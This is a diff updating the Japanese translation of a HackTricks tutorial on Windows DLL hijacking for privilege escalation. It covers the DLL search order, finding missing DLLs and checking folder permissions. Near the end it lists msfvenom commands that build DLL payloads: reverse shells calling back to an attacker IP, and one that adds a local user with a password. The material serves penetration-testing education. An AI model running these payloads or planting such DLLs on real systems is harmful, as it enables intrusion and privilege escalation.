@@ -2,115 +2,114 @@
 
 <details>
 
-<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>
+<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-HackTricksをサポートする他の方法:
+HackTricksをサポートする他の方法：
 
-* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をご確認ください。
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
-* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。
+- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**する。
+- **ハッキングトリックを共有する**には、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-**ハッキングキャリア**に興味があり、ハッキングできないものをハッキングしたい方は、**採用中です！** (_流暢なポーランド語の読み書きが必要です_).
+**ハッキングキャリア**に興味がある方や**解読不能なものをハック**したい方 - **採用中**です！（_流暢なポーランド語の読み書きが必要です_）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
-## 定義
+## 基本情報
 
-まず、定義から始めましょう。DLLハイジャックとは、広義には、**正当な/信頼されたアプリケーションに任意のDLLをロードさせること**です。_DLL Search Order Hijacking_、_DLL Load Order Hijacking_、_DLL Spoofing_、_DLL Injection_、_DLL Side-Loading_などの用語がしばしば -誤って- 同じ意味で使われます。
+DLLハイジャッキングは、信頼されたアプリケーションを悪意のあるDLLを読み込むように操作することを指します。この用語には、**DLLスプーフィング、インジェクション、およびサイドローディング**などの戦術が含まれます。主にコードの実行、持続性の達成、そして稀に特権昇格に使用されます。ここでは昇格に焦点を当てていますが、ハイジャッキングの方法は目的に関係なく一貫しています。
 
-Dllハイジャックは、**コードを実行**し、**永続性を獲得**し、**権限を昇格**させるために使用されます。これら3つの中で**最も見つけにくい**のは、**権限昇格**です。しかし、これは権限昇格セクションの一部であるため、このオプションに焦点を当てます。また、目標に関係なく、dllハイジャックは同じ方法で実行されることに注意してください。
+### 一般的な技術
 
-### タイプ
+DLLハイジャッキングには、アプリケーションのDLL読み込み戦略に依存する効果が異なるいくつかの方法があります。
 
-選択肢は多様で、成功はアプリケーションが必要なDLLをロードするように設定されているかによって異なります。可能なアプローチには以下が含まれます：
+1. **DLLの置換**: 正規のDLLを悪意のあるDLLと交換し、オプションでDLLプロキシングを使用して元のDLLの機能を保持します。
+2. **DLLサーチオーダーハイジャッキング**: 悪意のあるDLLを正規のDLLの前に検索パスに配置し、アプリケーションの検索パターンを悪用します。
+3. **ファントムDLLハイジャッキング**: アプリケーションが読み込む必要があるDLLが存在しないと思い込ませるために悪意のあるDLLを作成します。
+4. **DLLリダイレクション**: `%PATH%`や`.exe.manifest` / `.exe.local`ファイルなどの検索パラメータを変更して、アプリケーションを悪意のあるDLLに誘導します。
+5. **WinSxS DLLの置換**: WinSxSディレクトリ内の正規のDLLを悪意のあるDLLで置き換える方法であり、DLLサイドローディングとしばしば関連付けられます。
+6. **相対パスDLLハイジャッキング**: ユーザーが制御するディレクトリに悪意のあるDLLを配置し、バイナリプロキシ実行技術を模倣します。
 
-1. **DLLの置き換え**：正当なDLLを悪意のあるDLLに置き換える。これは_DLL Proxying_と組み合わせることができ、元のDLLのすべての機能が保持されることを保証します。
-2. **DLL検索順序のハイジャック**：アプリケーションによってパスなしで指定されたDLLは、特定の順序で固定された場所で検索されます。検索順序のハイジャックは、実際のDLLよりも前に検索される場所に悪意のあるDLLを配置することによって行われます。これには、対象アプリケーションの作業ディレクトリが含まれることがあります。
-3. **ファントムDLLハイジャック**：正当なアプリケーションがロードしようとする欠落している/存在しないDLLの代わりに悪意のあるDLLを配置します。
-4. **DLLのリダイレクト**：DLLが検索される場所を変更する。例えば、悪意のあるDLLを含むフォルダーを指定するために、`%PATH%`環境変数を編集するか、`.exe.manifest` / `.exe.local`ファイルを編集します。
-5. **WinSxS DLLの置き換え**：対象のDLLの関連するWinSxSフォルダー内の正当なDLLを悪意のあるDLLに置き換える。これはしばしばDLLサイドローディングと呼ばれます。
-6. **相対パスDLLハイジャック**：正当なアプリケーションをユーザーが書き込み可能なフォルダーにコピー（およびオプションで名前を変更）し、悪意のあるDLLと一緒に配置します。これは使用方法によっては、(署名された)バイナリプロキシ実行と類似しています。これの変種は、正当なアプリケーションを悪意のあるDLLと一緒に持ち込む（被害者のマシン上の正当な場所からコピーするのではなく）という、やや矛盾した「_bring your own LOLbin_」と呼ばれることがあります。
+## 欠落しているDLLの検出
 
-## 不足しているDllを見つける
-
-システム内の不足しているDllを見つける最も一般的な方法は、sysinternalsから[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定する**ことです：
+システム内の欠落しているDLLを見つける最も一般的な方法は、[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定**することです：
 
 ![](<../../.gitbook/assets/image (311).png>)
 
 ![](<../../.gitbook/assets/image (313).png>)
 
-そして、**ファイルシステムアクティビティ**だけを表示します：
+そして、**ファイルシステムアクティビティ**を表示します：
 
 ![](<../../.gitbook/assets/image (314).png>)
 
-一般に**不足しているdllを探している場合**は、これを**数秒間実行**しておきます。\
-特定の実行可能ファイル内の**不足しているdllを探している場合**は、**"Process Name" "contains" "\<exec name>"のような**別のフィルターを設定し、実行してからイベントのキャプチャを停止します。
+**一般的なDLLを検索**する場合は、数秒間これを実行しておきます。\
+**特定の実行可能ファイル内の欠落しているDLL**を探している場合は、「プロセス名」が「\<exec name>」を含むような**別のフィルターを設定**し、実行してからイベントのキャプチャを停止します。
 
-## 不足しているDllを悪用する
+## 欠落しているDLLの悪用
 
-権限を昇格させるためには、特権プロセスがロードしようとするdllを書き込むことができる最良のチャンスがあります。したがって、dllが検索される前にフォルダーにdllを**書き込む**ことができるか、元のdllが存在しないフォルダーにdllが検索される場所に**書き込む**ことができます。
+特権昇格するためには、**特権プロセスが読み込もうとするDLLを書き込むことができる**最適な方法は、**検索される場所のいずれかにDLLを書き込む**ことです。したがって、**元のDLLよりも前に検索されるフォルダー**にDLLを**書き込む**ことができるか、または**DLLが存在しない**フォルダーにDLLを書き込むことができるかもしれません。
 
-### Dll検索順序
+### DLL検索順序
 
-[**Microsoftドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)内で、Dllが具体的にどのようにロードされるかを見ることができます。
+[**Microsoftのドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **には、DLLが特定の方法で読み込まれる方法が記載されています。**
 
-一般的に、**Windowsアプリケーション**は**事前に定義された検索パスを使用してDLLを見つけ**、これらのパスを特定の順序でチェックします。DLLハイジャックは通常、これらのフォルダーのいずれかに悪意のあるDLLを配置し、そのDLLが正当なものよりも先に見つかるようにすることで発生します。この問題は、アプリケーションが必要なDLLの絶対パスを指定することで軽減できます。
+**Windowsアプリケーション**は、特定のシーケンスに従って一連の**事前定義された検索パス**に従ってDLLを検索します。DLLハイジャッキングの問題は、有害なDLLがこれらのディレクトリの1つに戦略的に配置され、正規のDLLよりも先に読み込まれるようにすることで発生します。これを防ぐ解決策は、アプリケーションが必要とするDLLを参照する際に絶対パスを使用することを確認することです。
 
-以下に32ビットシステムでの**DLL検索順序**を示します：
+32ビットシステムでの**DLL検索順序**は以下の通りです：
 
-1. アプリケーションがロードされたディレクトリ。
-2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)関数を使用します。（_C:\Windows\System32_）
-3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。（_C:\Windows\System_）
-4. Windowsディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)関数を使用します。
-1. (_C:\Windows_)
+1. アプリケーションが読み込まれたディレクトリ。
+2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使用します。(_C:\Windows\System32_)
+3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。(_C:\Windows\System_)
+4. Windowsディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使用します。(_C:\Windows_)
 5. 現在のディレクトリ。
-6. PATH環境変数にリストされているディレクトリ。これには、**App Paths**レジストリキーによって指定されたアプリケーションごとのパスは含まれません。**App Paths**キーはDLL検索パスを計算するときには使用されません。
+6. PATH環境変数にリストされているディレクトリ。これには、**App Paths**レジストリキーで指定されたアプリケーションごとのパスは含まれません。**App Paths**キーは、DLL検索パスの計算に使用されません。
 
-これが**SafeDllSearchMode**が有効になっているときの**デフォルト**の検索順序です。無効になっている場合、現在のディレクトリが2番目に昇格します。この機能を無効にするには、**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**レジストリ値を作成し、0に設定します（デフォルトは有効）。
+これが**SafeDllSearchMode**が有効な状態での**デフォルト**の検索順序です。無効にするには、**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成し、0に設定します（デフォルトは有効）。
 
-[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)関数が**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**で呼び出されると、検索は**LoadLibraryEx**がロードしている実行可能モジュールのディレクトリから始まります。
+[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**で呼び出されると、検索は**LoadLibraryEx**が読み込んでいる実行可能モジュールのディレクトリから開始されます。
 
-最後に、**dllは絶対パスを指定してロードされることがあります**。その場合、そのdllは**そのパスでのみ検索されます**（dllに依存関係がある場合、それらは名前だけでロードされたかのように検索されます）。
+最後に、**絶対パスを指定してDLLを読み込むこともできる**ことに注意してください。その場合、そのDLLは**そのパスのみで検索されます**（DLLに依存関係がある場合、名前で読み込まれるだけです）。
 
-検索順序を変更する他の方法がありますが、ここでは説明しません。
+検索順序を変更する他の方法もありますが、ここでは説明しません。
 
-#### Windowsドキュメントからのdll検索順序の例外
+#### WindowsドキュメントのDLL検索順序の例外
 
-* **同じモジュール名のDLLがすでにメモリにロードされている場合**、システムはリダイレクトとマニフェストのみをチェックし、DLLがどのディレクトリにあるかに関係なく、ロードされたDLLに解決します。**システムはDLLを検索しません**。
-* DLLがアプリケーションが実行されているWindowsのバージョンの**既知のDLLのリスト**にある場合、システムはDLLを検索する代わりに既知のDLLのコピーを使用します（および既知のDLLの依存するDLLがある場合はそれらも）。現在のシステムの既知のDLLのリストについては、次のレジストリキーを参照してください：**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**。
-* **DLLに依存関係がある場合**、システムは依存するDLLをモジュール名だけでロードされたかのように**検索します**。これは、最初のDLLが完全なパスを指定してロードされた場合でも当てはまります。
+Windowsドキュメントには、標準的なDLL検索順序に関する特定の例外が記載されています：
 
-### 権限の昇格
+- メモリに読み込まれている**DLLと同じ名前を持つDLL**が見つかった場合、システムは通常の検索をバイパスします。代わりに、リダイレクションとマニフェストのチェックを実行し、メモリにすでにあるDLLにデフォルトで戻ります。**このシナリオでは、システムはDLLの検索を実行しません**。
+- DLLが現在のWindowsバージョンの**既知のDLL**として認識される場合、システムはその既知のDLLのバージョンとその依存するDLLを利用し、**検索プロセスをスキップ**します。レジストリキー**HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**には、これらの既知のDLLのリストが格納されています。
+- DLLに依存関係がある場合、最初のDLLがフルパスで識別されたかどうかに関係なく、これらの依存するDLLの検索は、**モジュール名のみで指定されたかのように**実行されます。
 
-**必要条件**：
+### 特権昇格
 
-* **他の権限で実行される/実行されるプロセスを見つける**（水平/横方向の移動）**dllが不足している**。
-* dllが検索される**任意のフォルダー**に**書き込み権限**を持っている（おそらく実行可能ファイルのディレクトリまたはシステムパス内のいくつかのフォルダー）。
+**要件**：
 
-はい、必要条件は見つけるのが難しいです。**デフォルトでは、dllが不足している特権実行可能ファイルを見つけるのはかなり奇妙**であり、システムパスフォルダーに書き込み権限を持っていることは**さらに奇妙**です（デフォルトではできません）。しかし、設定が誤っている環境ではこれが可能です。\
-幸運にも要件を満たしている場合は、[UACME](https://github.com/hfiref0x/UACME)プロジェクトをチェックできます。**プロジェクトの主な目的はUACをバイパスすることですが**、書き込み権限を持つフォルダーのパスを変更するだけで使用できるWindowsバージョンのDllハイジャックの**PoC**を見つけることができます。
+- **異なる特権で動作するプロセス**を特定し、または特定する（水平または垂直移動）、**DLLが欠落している**。
+- DLLが**検索される任意のディレクトリに書き込みアクセス**が利用可能であることを確認します。この場所は、実行可能ファイルのディレクトリまたはシステムパス内のディレクトリである可能性があります。
 
-フォルダー内の権限を**確認するには**：
+はい、**デフォルトでは特権のある実行可能ファイルが欠落しているDLLを見つけるのはかなり奇妙**であり、**システムパスのフォルダに書き込み権限を持つのはさらに奇妙**です（デフォルトではできません）。ただし、構成が誤っている環境では、これが可能です。\
+要件を満たす幸運な状況に自分自身を見つけた場合は、[UACME](https://github.com/hfiref0x/UACME)プロジェクトをチェックしてみてください。プロジェクトの**主な目標はUACをバイパスすること**ですが、おそらく書き込み権限のあるフォルダのパスを変更するだけで使用できるWindowsバージョンのDLLハイジャッキングのPoCを見つけることができます。
+
+フォルダーの**アクセス許可を確認する**には、次のようにします：
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-And **PATH内のすべてのフォルダーの権限を確認します**：
+そして、**PATH内のすべてのフォルダのアクセス許可を確認します**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-実行可能ファイルのインポートとdllのエクスポートを以下で確認することもできます：
+次のコマンドを使用して、実行可能ファイルのインポートとDLLのエクスポートを確認することもできます:
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-以下は、特権を昇格させるために **Dll Hijackingを悪用する** 完全なガイドです。**System Pathフォルダー**に書き込み権限がある場合は、以下を確認してください：
+**Dll Hijackingを悪用して特権を昇格**するための完全なガイドについては、**System Pathフォルダ**に書き込み権限があるかどうかを確認してください：
 
 {% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
 [writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
@@ -118,39 +117,39 @@ dumpbin /export /path/file.dll
 
 ### 自動化ツール
 
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、システムPATH内の任意のフォルダーに書き込み権限があるかどうかをチェックします。
-この脆弱性を発見するための他の興味深い自動化ツールには、**PowerSploit関数**があります：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_。
+[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、システムPATH内の任意のフォルダに書き込み権限があるかどうかをチェックします。\
+この脆弱性を発見するための他の興味深い自動化ツールには、**PowerSploit functions**があります：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_。
 
 ### 例
 
-悪用可能なシナリオを見つけた場合、成功裏に悪用するための最も重要なことの一つは、**実行可能ファイルがそれからインポートするすべての関数をエクスポートするdllを作成する**ことです。とにかく、Dll Hijackingは[Medium IntegrityレベルからHigh **(UACをバイパスして)**](../authentication-credentials-uac-and-efs.md#uac)昇格するため、または[**High IntegrityからSYSTEM**](./#from-high-integrity-to-system)**へ昇格するために便利です。** 有効なdllの作成方法の例は、実行のためのdllハイジャックに焦点を当てたこのdllハイジャック研究内で見つけることができます： [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**
-さらに、**次のセクション**では、**基本的なdllコード**のいくつかを見つけることができます。これらは**テンプレート**として、または**必要ない関数をエクスポートするdllを作成する**ために役立つかもしれません。
+悪用可能なシナリオを見つけた場合、それを成功裏に悪用するために最も重要なことの1つは、**実行ファイルがそれからインポートするすべての関数を少なくともエクスポートするdllを作成する**ことです。とにかく、Dll Hijackingは、中間インテグリティレベルから高い**（UACをバイパス）**に昇格するか、[**高いインテグリティからSYSTEMに**](./#from-high-integrity-to-system)**昇格する**のに便利です。有効なdllを作成する方法の例は、このdllハイジャッキング研究に焦点を当てたサイトで見つけることができます：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
+さらに、**次のセクション**では、**テンプレートとして役立つ基本的なdllコード**をいくつか見つけることができます。また、**必要のない関数がエクスポートされたdllを作成する**ために使用できます。
 
 ## **Dllの作成とコンパイル**
 
 ### **Dllプロキシ化**
 
-基本的に**Dllプロキシ**は、ロードされたときに**悪意のあるコードを実行する**能力を持つと同時に、**実際のライブラリへのすべての呼び出しをリレーすることで**、**期待されるように**機能するDllです。
+基本的に**Dllプロキシ**は、**ロードされるときに悪意のあるコードを実行**できるDllですが、**実際のライブラリにすべての呼び出しをリレーすることで、公開され、機能する**こともできます。
 
-ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使用すると、実際に**実行可能ファイルを指定してプロキシ化したいライブラリを選択し**、**プロキシ化されたdllを生成する**か、**Dllを指定してプロキシ化されたdllを生成する**ことができます。
+ツール[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使用すると、実際に**実行可能ファイルを指定し、プロキシ化したいライブラリ**を選択して**プロキシ化されたdllを生成**するか、**Dllを指定してプロキシ化されたdllを生成**することができます。
 
 ### **Meterpreter**
 
-**リバースシェルを取得する (x64):**
+**rev shellを取得（x64）:**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**メータープリター (x86) を取得する:**
+**メータープリンターを取得する（x86）:**
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**ユーザーを作成する（x86版のみ、x64版は見当たらない）：**
+**ユーザーを作成します（x86バージョンは見当たりませんでした）:**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
-### 自作
+### あなた自身
 
-いくつかのケースでは、コンパイルしたDllは、被害者プロセスによってロードされる**いくつかの関数をエクスポート**する必要があります。これらの関数が存在しない場合、**バイナリはそれらをロードできず**、**エクスプロイトは失敗します**。
+複数のケースで、コンパイルしたDllは、被害者プロセスによってロードされる関数を**複数エクスポートする必要があります**。これらの関数が存在しない場合、**バイナリはそれらをロードできず、攻撃は失敗します**。
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -231,24 +230,26 @@ break;
 return TRUE;
 }
 ```
-```markdown
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+## 参考文献
+* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
+* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
 
-**ハッキングキャリア**に興味があり、ハック不可能をハックしたい方 - **採用情報！** (_流暢なポーランド語の読み書きが必要です_).
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+
+**ハッキングキャリア**に興味がある方や、**解読不能なものをハック**したい方へ - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>
 
-HackTricksをサポートする他の方法:
+HackTricksをサポートする他の方法：
 
-* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
-* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
+* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を手に入れる
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**する
+* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する
 
 </details>
-```
